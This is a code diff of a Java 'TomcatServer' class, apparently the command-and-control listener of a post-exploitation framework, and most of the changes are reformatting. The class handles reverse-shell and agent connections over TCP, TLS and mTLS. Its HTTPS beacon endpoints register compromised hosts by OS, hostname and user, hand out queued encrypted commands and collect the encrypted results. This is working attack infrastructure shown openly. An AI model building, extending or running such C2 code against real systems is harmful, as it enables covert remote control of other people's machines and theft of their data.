@@ -27,18 +27,18 @@ import javax.net.ssl.*;
  */
 public final class TomcatServer extends BaseServer {
 
-    private ServerSocket    TcpSocket;
+    private ServerSocket TcpSocket;
     private SSLServerSocket TlsSocket;
-    private ServerSocket    BeaconSocket;
+    private ServerSocket BeaconSocket;
 
     private Thread AcceptTcpThread;
     private Thread AcceptBeaconThread;
 
     private final ExecutorService Pool;
 
-    private final ConcurrentHashMap<Integer, String>  PendingCommands = new ConcurrentHashMap<>();
-    private final ConcurrentHashMap<Integer, String>  PendingOutputs  = new ConcurrentHashMap<>();
-    private final ConcurrentHashMap<String,  Integer> TokenMap        = new ConcurrentHashMap<>();
+    private final ConcurrentHashMap<Integer, String> PendingCommands = new ConcurrentHashMap<>();
+    private final ConcurrentHashMap<Integer, String> PendingOutputs = new ConcurrentHashMap<>();
+    private final ConcurrentHashMap<String, Integer> TokenMap = new ConcurrentHashMap<>();
 
     public TomcatServer(String Host, int Port, ListenerMode Mode, ServerConfig Config) {
         super(Host, Port, Mode, Config);
@@ -55,12 +55,14 @@ public final class TomcatServer extends BaseServer {
             OpenSockets();
             Running = true;
             Logger.Info("Server started — " + Host + ":" + Port + " [" + Mode.name() + "]");
-            Events.Trigger(EventType.ServerStarted,
-                EventManager.BuildData("Host", Host, "Port", Port, "Mode", Mode.name()));
-            return new boolean[]{ true };
+            Events.Trigger(
+                EventType.ServerStarted,
+                EventManager.BuildData("Host", Host, "Port", Port, "Mode", Mode.name())
+            );
+            return new boolean[] { true };
         } catch (Exception E) {
             Logger.Error("Server start failed [" + Mode + "]: " + E.getMessage());
-            return new boolean[]{ false };
+            return new boolean[] { false };
         }
     }
 
@@ -88,18 +90,18 @@ public final class TomcatServer extends BaseServer {
                 TlsSocket = (SSLServerSocket) Ctx.getServerSocketFactory()
                     .createServerSocket(Port, 50, InetAddress.getByName(Host));
                 TlsSocket.setNeedClientAuth(Mode == ListenerMode.MTLS);
-                TlsSocket.setEnabledProtocols(new String[]{ Config.GetTlsProtocol(), "TLSv1.2" });
-                Logger.Verbose("TLS socket bound on " + Port
-                    + " clientAuth=" + (Mode == ListenerMode.MTLS));
+                TlsSocket.setEnabledProtocols(new String[] { Config.GetTlsProtocol(), "TLSv1.2" });
+                Logger.Verbose("TLS socket bound on " + Port + " clientAuth=" + (Mode == ListenerMode.MTLS));
             }
             case HTTPS -> {
                 if (BeaconPort <= 0) BeaconPort = Port;
                 SSLContext Ctx = BuildSslContext(false);
                 BeaconSocket = ((SSLServerSocket) Ctx.getServerSocketFactory()
-                    .createServerSocket(BeaconPort, 50, InetAddress.getByName(Host)));
+                        .createServerSocket(BeaconPort, 50, InetAddress.getByName(Host)));
                 ((SSLServerSocket) BeaconSocket).setNeedClientAuth(false);
                 ((SSLServerSocket) BeaconSocket).setEnabledProtocols(
-                    new String[]{ Config.GetTlsProtocol(), "TLSv1.2" });
+                        new String[] { Config.GetTlsProtocol(), "TLSv1.2" }
+                    );
                 Logger.Verbose("HTTPS beacon socket bound on " + BeaconPort);
             }
             case FMTLS -> {
@@ -107,14 +109,15 @@ public final class TomcatServer extends BaseServer {
                 TlsSocket = (SSLServerSocket) TcpCtx.getServerSocketFactory()
                     .createServerSocket(Port, 50, InetAddress.getByName(Host));
                 TlsSocket.setNeedClientAuth(true);
-                TlsSocket.setEnabledProtocols(new String[]{ Config.GetTlsProtocol(), "TLSv1.2" });
+                TlsSocket.setEnabledProtocols(new String[] { Config.GetTlsProtocol(), "TLSv1.2" });
                 if (BeaconPort > 0) {
                     SSLContext BeaconCtx = BuildSslContext(true);
                     BeaconSocket = (SSLServerSocket) BeaconCtx.getServerSocketFactory()
                         .createServerSocket(BeaconPort, 50, InetAddress.getByName(Host));
                     ((SSLServerSocket) BeaconSocket).setNeedClientAuth(true);
                     ((SSLServerSocket) BeaconSocket).setEnabledProtocols(
-                        new String[]{ Config.GetTlsProtocol(), "TLSv1.2" });
+                            new String[] { Config.GetTlsProtocol(), "TLSv1.2" }
+                        );
                     Logger.Info("HTTPS/mTLS beacon socket bound on " + BeaconPort);
                 }
                 Logger.Verbose("mTLS TCP socket bound on " + Port);
@@ -134,7 +137,7 @@ public final class TomcatServer extends BaseServer {
         CloseQuietly(TcpSocket);
         CloseQuietly(TlsSocket);
         CloseQuietly(BeaconSocket);
-        if (AcceptTcpThread    != null) AcceptTcpThread.interrupt();
+        if (AcceptTcpThread != null) AcceptTcpThread.interrupt();
         if (AcceptBeaconThread != null) AcceptBeaconThread.interrupt();
         Sessions.Clear();
         Pool.shutdown();
@@ -146,8 +149,7 @@ public final class TomcatServer extends BaseServer {
     public void AcceptConnections() {
         if (BeaconSocket != null) {
             boolean IsTls = (BeaconSocket instanceof SSLServerSocket);
-            AcceptBeaconThread = new Thread(
-                () -> BeaconAcceptLoop(BeaconSocket, IsTls), "BeaconAccept");
+            AcceptBeaconThread = new Thread(() -> BeaconAcceptLoop(BeaconSocket, IsTls), "BeaconAccept");
             AcceptBeaconThread.setDaemon(true);
             AcceptBeaconThread.start();
         }
@@ -156,7 +158,11 @@ public final class TomcatServer extends BaseServer {
         if (Active == null) {
             Logger.Warn("No TCP socket open for mode " + Mode + " — beacon-only mode");
             while (Running) {
-                try { Thread.sleep(1000); } catch (InterruptedException E) { break; }
+                try {
+                    Thread.sleep(1000);
+                } catch (InterruptedException E) {
+                    break;
+                }
             }
             return;
         }
@@ -167,8 +173,7 @@ public final class TomcatServer extends BaseServer {
                 Socket Client = Active.accept();
                 Logger.Verbose("Accepted TCP from " + Client.getRemoteSocketAddress());
                 Pool.submit(() -> HandleTcp(Client));
-            } catch (SocketTimeoutException Ignored) {
-            } catch (IOException E) {
+            } catch (SocketTimeoutException Ignored) {} catch (IOException E) {
                 if (Running) Logger.Error("TCP accept error: " + E.getMessage());
                 break;
             }
@@ -181,8 +186,7 @@ public final class TomcatServer extends BaseServer {
                 Socket Client = Sock.accept();
                 Logger.Verbose("Accepted beacon from " + Client.getRemoteSocketAddress());
                 Pool.submit(() -> HandleBeacon(Client, IsTls));
-            } catch (SocketTimeoutException Ignored) {
-            } catch (IOException E) {
+            } catch (SocketTimeoutException Ignored) {} catch (IOException E) {
                 if (Running) Logger.Error("Beacon accept error: " + E.getMessage());
                 break;
             }
@@ -196,10 +200,15 @@ public final class TomcatServer extends BaseServer {
             String RemoteAddr = Client.getRemoteSocketAddress().toString();
 
             if (Mode == ListenerMode.RAW) {
-                SessionId = RegisterRaw(Client,
-                    new DetectionResult(ConnectionType.RAW,
-                        new PushbackInputStream(Client.getInputStream(), 512), new byte[0]),
-                    RemoteAddr);
+                SessionId = RegisterRaw(
+                    Client,
+                    new DetectionResult(
+                        ConnectionType.RAW,
+                        new PushbackInputStream(Client.getInputStream(), 512),
+                        new byte[0]
+                    ),
+                    RemoteAddr
+                );
                 return;
             }
 
@@ -210,21 +219,24 @@ public final class TomcatServer extends BaseServer {
                 case TOMCAT -> {
                     if (!Mode.AcceptsTomcatAgent()) {
                         Logger.Warn("Mode " + Mode + " does not accept TOMCAT agents — dropping");
-                        CloseQuietly(Client); return;
+                        CloseQuietly(Client);
+                        return;
                     }
                     SessionId = RegisterTomcat(Client, Det, RemoteAddr);
                 }
                 case RAW -> {
                     if (!Mode.AcceptsRawShell()) {
                         Logger.Warn("Mode " + Mode + " does not accept raw shells — dropping");
-                        CloseQuietly(Client); return;
+                        CloseQuietly(Client);
+                        return;
                     }
                     SessionId = RegisterRaw(Client, Det, RemoteAddr);
                 }
                 case HTTP -> {
                     if (!Mode.AcceptsHttp()) {
                         Logger.Warn("Mode " + Mode + " does not accept HTTP — dropping");
-                        CloseQuietly(Client); return;
+                        CloseQuietly(Client);
+                        return;
                     }
                     HandleBeacon(Client, false);
                 }
@@ -248,8 +260,7 @@ public final class TomcatServer extends BaseServer {
             return -1;
         }
 
-        Map<String, Object> Info = TomcatHandshake(
-            Det.Stream, Client.getOutputStream(), Config.GetConnectionTimeout());
+        Map<String, Object> Info = TomcatHandshake(Det.Stream, Client.getOutputStream(), Config.GetConnectionTimeout());
 
         Session S = BuildSession(Client, RemoteAddr, Info, false);
         S.SetSessionType(Session.Type.TOMCAT);
@@ -267,8 +278,7 @@ public final class TomcatServer extends BaseServer {
     }
 
     private int RegisterRaw(Socket Client, DetectionResult Det, String RemoteAddr) throws Exception {
-        Map<String, Object> Info = RawHandshake(
-            Det.Stream, Client.getOutputStream(), RemoteAddr);
+        Map<String, Object> Info = RawHandshake(Det.Stream, Client.getOutputStream(), RemoteAddr);
 
         Session S = BuildSession(Client, RemoteAddr, Info, true);
         S.SetSessionType(Session.Type.REVERSE_SHELL);
@@ -288,29 +298,30 @@ public final class TomcatServer extends BaseServer {
         int SessionId = -1;
         try {
             Client.setSoTimeout(Config.GetConnectionTimeout());
-            InputStream  In  = Client.getInputStream();
+            InputStream In = Client.getInputStream();
             OutputStream Out = Client.getOutputStream();
 
             String ReqLine = ReadLine(In);
-            if (ReqLine == null || ReqLine.isBlank()) { CloseQuietly(Client); return; }
+            if (ReqLine == null || ReqLine.isBlank()) {
+                CloseQuietly(Client);
+                return;
+            }
             Logger.Verbose("Beacon request: " + ReqLine);
 
             Map<String, String> Headers = new LinkedHashMap<>();
             String Line;
             while (!(Line = ReadLine(In)).isEmpty()) {
                 int C = Line.indexOf(':');
-                if (C > 0) Headers.put(Line.substring(0, C).trim().toLowerCase(),
-                                       Line.substring(C + 1).trim());
+                if (C > 0) Headers.put(Line.substring(0, C).trim().toLowerCase(), Line.substring(C + 1).trim());
             }
 
-            int    ContentLen = parseInt(Headers.getOrDefault("content-length", "0"), 0);
-            byte[] Body       = ContentLen > 0 ? In.readNBytes(ContentLen) : new byte[0];
-            String[] Parts    = ReqLine.split(" ");
-            String Method     = Parts.length > 0 ? Parts[0] : "GET";
-            String Full       = Parts.length > 1 ? Parts[1] : "/";
-            String Path       = Full.contains("?") ? Full.substring(0, Full.indexOf('?')) : Full;
-            Map<String, String> Query = ParseQuery(Full.contains("?")
-                ? Full.substring(Full.indexOf('?') + 1) : "");
+            int ContentLen = parseInt(Headers.getOrDefault("content-length", "0"), 0);
+            byte[] Body = ContentLen > 0 ? In.readNBytes(ContentLen) : new byte[0];
+            String[] Parts = ReqLine.split(" ");
+            String Method = Parts.length > 0 ? Parts[0] : "GET";
+            String Full = Parts.length > 1 ? Parts[1] : "/";
+            String Path = Full.contains("?") ? Full.substring(0, Full.indexOf('?')) : Full;
+            Map<String, String> Query = ParseQuery(Full.contains("?") ? Full.substring(Full.indexOf('?') + 1) : "");
 
             if (Path.equals("/register") && Method.equals("POST")) {
                 SessionId = BeaconRegister(Client, Out, Body, IsTls);
@@ -332,18 +343,21 @@ public final class TomcatServer extends BaseServer {
     private int BeaconRegister(Socket Client, OutputStream Out, byte[] Body, boolean IsTls) throws Exception {
         String Json = new String(Body, "UTF-8").trim();
         if (!Json.startsWith("{")) {
-            HttpReply(Out, 400, "Bad Request", "Expected JSON".getBytes()); return -1;
+            HttpReply(Out, 400, "Bad Request", "Expected JSON".getBytes());
+            return -1;
         }
         String CertCn = ValidateMtlsCert(Client);
         if (CertCn == null && Mode.RequiresClientCert()) {
-            HttpReply(Out, 403, "Forbidden", "Client cert required".getBytes()); return -1;
+            HttpReply(Out, 403, "Forbidden", "Client cert required".getBytes());
+            return -1;
         }
 
         @SuppressWarnings("unchecked")
         Map<String, Object> Info = Gson.fromJson(Json, Map.class);
-        for (String F : new String[]{"os", "hostname", "user"}) {
+        for (String F : new String[] { "os", "hostname", "user" }) {
             if (!Info.containsKey(F)) {
-                HttpReply(Out, 400, "Bad Request", ("Missing: " + F).getBytes()); return -1;
+                HttpReply(Out, 400, "Bad Request", ("Missing: " + F).getBytes());
+                return -1;
             }
         }
 
@@ -368,7 +382,10 @@ public final class TomcatServer extends BaseServer {
 
     private void BeaconGet(OutputStream Out, Map<String, String> Query) throws Exception {
         Integer Id = ResolveToken(Query);
-        if (Id == null) { HttpReply(Out, 403, "Forbidden", "Invalid token".getBytes()); return; }
+        if (Id == null) {
+            HttpReply(Out, 403, "Forbidden", "Invalid token".getBytes());
+            return;
+        }
         String Cmd = PendingCommands.remove(Id);
         byte[] Enc = Crypto.Encrypt((Cmd != null ? Cmd : "IDLE").getBytes("UTF-8"));
         HttpReply(Out, 200, "OK", Base64.getEncoder().encode(Enc));
@@ -376,7 +393,10 @@ public final class TomcatServer extends BaseServer {
 
     private void BeaconPost(OutputStream Out, Map<String, String> Query, byte[] Body) throws Exception {
         Integer Id = ResolveToken(Query);
-        if (Id == null) { HttpReply(Out, 403, "Forbidden", "Invalid token".getBytes()); return; }
+        if (Id == null) {
+            HttpReply(Out, 403, "Forbidden", "Invalid token".getBytes());
+            return;
+        }
         if (Body.length > 0) {
             byte[] Dec = Base64.getDecoder().decode(Body);
             PendingOutputs.put(Id, Crypto.DecryptString(Dec));
@@ -399,8 +419,12 @@ public final class TomcatServer extends BaseServer {
                 long Dead = System.currentTimeMillis() + Config.GetCommandTimeout();
                 while (System.currentTimeMillis() < Dead) {
                     String Result = PendingOutputs.remove(SessionId);
-                    if (Result != null) return new String[]{ "true", Result };
-                    try { Thread.sleep(300); } catch (InterruptedException E) { break; }
+                    if (Result != null) return new String[] { "true", Result };
+                    try {
+                        Thread.sleep(300);
+                    } catch (InterruptedException E) {
+                        break;
+                    }
                 }
                 PendingCommands.remove(SessionId);
                 return Fail("Agent timeout");
@@ -416,8 +440,7 @@ public final class TomcatServer extends BaseServer {
         return Id;
     }
 
-    private Session BuildSession(Socket Client, String RemoteAddr,
-                                  Map<String, Object> Info, boolean IsRaw) {
+    private Session BuildSession(Socket Client, String RemoteAddr, Map<String, Object> Info, boolean IsRaw) {
         Session S = new Session();
         S.SetSocket(Client);
         S.SetRemoteAddress(RemoteAddr);
@@ -425,8 +448,9 @@ public final class TomcatServer extends BaseServer {
         S.SetHostname(str(Info, "hostname"));
         S.SetUser(str(Info, "user"));
         S.SetArch(str(Info, "architecture"));
-        S.SetAgentIp(str(Info, "agentip",
-            RemoteAddr.contains("/") ? RemoteAddr.split("/")[1].split(":")[0] : RemoteAddr));
+        S.SetAgentIp(
+            str(Info, "agentip", RemoteAddr.contains("/") ? RemoteAddr.split("/")[1].split(":")[0] : RemoteAddr)
+        );
         S.SetRawMode(IsRaw);
         String Name = str(Info, "hostname");
         S.SetAgentName(Name.equals("Unknown") ? "Agent-" + (Sessions.Count() + 1) : Name);
@@ -434,38 +458,64 @@ public final class TomcatServer extends BaseServer {
     }
 
     private void FireConnected(Session S, int Id) {
-        Events.Trigger(EventType.AgentConnected,
+        Events.Trigger(
+            EventType.AgentConnected,
             EventManager.BuildData(
-                "ID",          Id,
-                "Hostname",    S.GetHostname(),
-                "OS",          S.GetOs(),
-                "User",        S.GetUser(),
-                "Arch",        S.GetArch(),
-                "AgentIP",     S.GetAgentIp(),
-                "AgentName",   S.GetAgentName(),
-                "Address",     S.GetRemoteAddress(),
-                "Type",        S.GetSessionType().name(),
-                "ShellMode",   S.GetShellMode(),
-                "Encrypted",   S.IsEncrypted(),
-                "MtlsEnabled", S.IsMtlsEnabled(),
-                "CertCN",      S.GetCertCn()
-            ));
-        Logger.Info(String.format("[+] Session-%d | %-12s | %s@%s | %s | enc=%s mtls=%s",
-            Id, S.GetSessionType().name(), S.GetUser(), S.GetHostname(),
-            S.GetOs(), S.IsEncrypted(), S.IsMtlsEnabled()));
+                "ID",
+                Id,
+                "Hostname",
+                S.GetHostname(),
+                "OS",
+                S.GetOs(),
+                "User",
+                S.GetUser(),
+                "Arch",
+                S.GetArch(),
+                "AgentIP",
+                S.GetAgentIp(),
+                "AgentName",
+                S.GetAgentName(),
+                "Address",
+                S.GetRemoteAddress(),
+                "Type",
+                S.GetSessionType().name(),
+                "ShellMode",
+                S.GetShellMode(),
+                "Encrypted",
+                S.IsEncrypted(),
+                "MtlsEnabled",
+                S.IsMtlsEnabled(),
+                "CertCN",
+                S.GetCertCn()
+            )
+        );
+        Logger.Info(
+            String.format(
+                "[+] Session-%d | %-12s | %s@%s | %s | enc=%s mtls=%s",
+                Id,
+                S.GetSessionType().name(),
+                S.GetUser(),
+                S.GetHostname(),
+                S.GetOs(),
+                S.IsEncrypted(),
+                S.IsMtlsEnabled()
+            )
+        );
     }
 
     private String ValidateMtlsCert(Socket Sock) {
         if (!(Sock instanceof SSLSocket)) return null;
         try {
-            javax.security.cert.X509Certificate[] Chain =
-                ((SSLSocket) Sock).getSession().getPeerCertificateChain();
+            java.security.cert.Certificate[] Chain = ((SSLSocket) Sock).getSession().getPeerCertificates();
             if (Chain == null || Chain.length == 0) return null;
-            String Dn = Chain[0].getSubjectDN().getName();
+            java.security.cert.X509Certificate Cert = (java.security.cert.X509Certificate) Chain[0];
+            String Dn = Cert.getSubjectX500Principal().getName();
             for (String Part : Dn.split(",")) {
                 Part = Part.trim();
                 if (Part.startsWith("CN=")) return Part.substring(3);
             }
+        } catch (javax.net.ssl.SSLPeerUnverifiedException E) {
+            Logger.Verbose("No peer cert (mTLS not enforced): " + E.getMessage());
         } catch (Exception E) {
             Logger.Verbose("Cert CN extraction failed: " + E.getMessage());
         }
@@ -499,12 +549,18 @@ public final class TomcatServer extends BaseServer {
         return M;
     }
 
-    private static void HttpReply(OutputStream Out, int Status, String Reason,
-                                   byte[] Body) throws IOException {
-        String H = "HTTP/1.1 " + Status + " " + Reason + "\r\n"
-                 + "Content-Length: " + Body.length + "\r\n"
-                 + "Content-Type: application/octet-stream\r\n"
-                 + "Connection: close\r\n\r\n";
+    private static void HttpReply(OutputStream Out, int Status, String Reason, byte[] Body) throws IOException {
+        String H =
+            "HTTP/1.1 " +
+            Status +
+            " " +
+            Reason +
+            "\r\n" +
+            "Content-Length: " +
+            Body.length +
+            "\r\n" +
+            "Content-Type: application/octet-stream\r\n" +
+            "Connection: close\r\n\r\n";
         Out.write(H.getBytes("UTF-8"));
         if (Body.length > 0) Out.write(Body);
         Out.flush();
@@ -512,16 +568,25 @@ public final class TomcatServer extends BaseServer {
 
     private static void CloseQuietly(Closeable C) {
         if (C == null) return;
-        try { C.close(); } catch (Exception Ignored) {}
+        try {
+            C.close();
+        } catch (Exception Ignored) {}
     }
 
     private static String str(Map<String, Object> M, String K) {
         return str(M, K, "Unknown");
     }
+
     private static String str(Map<String, Object> M, String K, String Def) {
-        Object V = M.get(K); return V != null ? V.toString() : Def;
+        Object V = M.get(K);
+        return V != null ? V.toString() : Def;
     }
+
     private static int parseInt(String S, int Def) {
-        try { return Integer.parseInt(S.trim()); } catch (Exception E) { return Def; }
+        try {
+            return Integer.parseInt(S.trim());
+        } catch (Exception E) {
+            return Def;
+        }
     }
 }
